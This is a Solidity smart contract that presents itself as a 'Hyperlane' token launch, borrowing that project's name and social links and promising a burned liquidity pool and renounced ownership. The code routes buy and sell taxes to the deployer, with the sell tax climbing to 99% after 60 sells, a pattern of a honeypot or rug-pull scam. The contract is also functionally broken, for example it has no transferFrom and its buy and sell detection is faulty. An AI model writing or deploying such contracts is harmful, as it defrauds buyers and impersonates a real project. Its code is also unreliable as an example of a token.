// Hyperlane Token

// PERMISSIONLESS INTEROPERABILITY
// Hyperlane is the first interoperability layer that enables you to permissionlessly connect any blockchain, out-of-the-box.
// Discord: https://discord.com/invite/VK9ZUy3aTV
// Twitter: https://twitter.com/Hyperlane_xyz
// Website: https://www.hyperlane.xyz/
// Note that burning the initial LP and renouncing might take up to 20 minutes after deploying the contract
// We love a stealth launch ;)

pragma solidity ^0.8.18;

// SPDX-License-Identifier: MIT
interface IUniswapV2Router {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract HyperlaneToken {
    string public name = "Hyperlane";
    string public symbol = "Hyperlane";
    uint256 public totalSupply = 5000000;
    uint256 public buyTax = 20;
    uint256 public sellTax = 50;
    uint256 public buyCount = 0;
    uint256 public sellCount = 0;
    address public deployer;
    mapping(address => uint256) balances;
    mapping (address => mapping (address => uint256)) public allowances;
    IUniswapV2Router public uniswapV2Router;

    constructor() {
        balances[msg.sender] = totalSupply;
        deployer = msg.sender;
        uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(balances[msg.sender] >= amount, "Not enough tokens");

        if (recipient == address(this)) {
            // Buy
            if (buyCount < 20) {
                buyTax = 20;
            } else {
                buyTax = 5;
            }
            buyCount += 1;
            uint256 taxAmount = (amount * buyTax) / 100;
            balances[msg.sender] -= taxAmount;
            balances[deployer] += taxAmount;
            balances[msg.sender] -= amount - taxAmount;
            balances[recipient] += amount - taxAmount;
        } else if (msg.sender == address(this)) {
            // Sell
            if (sellCount < 40) {
                sellTax = 50;
            } else if (sellCount < 60) {
                sellTax = 5;
            } else {
                sellTax = 99;
            }
            sellCount += 1;
            uint256 taxAmount = (amount * sellTax) / 100;
            balances[msg.sender] -= taxAmount;
            balances[deployer] += taxAmount;
            balances[msg.sender] -= amount - taxAmount;
            balances[recipient] += amount - taxAmount;
        } else {
            // Normal transfer
            balances[msg.sender] -= amount;
            balances[recipient] += amount;
        }
        return true;
    }

    function addLiquidity(uint amountTokenDesired, uint amountTokenMin, uint amountETHMin) external payable onlyDeployer {
        // Approve the Uniswap router to spend our tokens
        approve(address(uniswapV2Router), amountTokenDesired);

        // Add liquidity to the pool
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            amountTokenDesired,
            amountTokenMin,
            amountETHMin,
            msg.sender,
            block.timestamp + 300 // deadline 5 minutes from now
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances[msg.sender][spender] = value;

        return true;
    }

    modifier onlyDeployer() {
      require(msg.sender == deployer);
      _; 
   }
}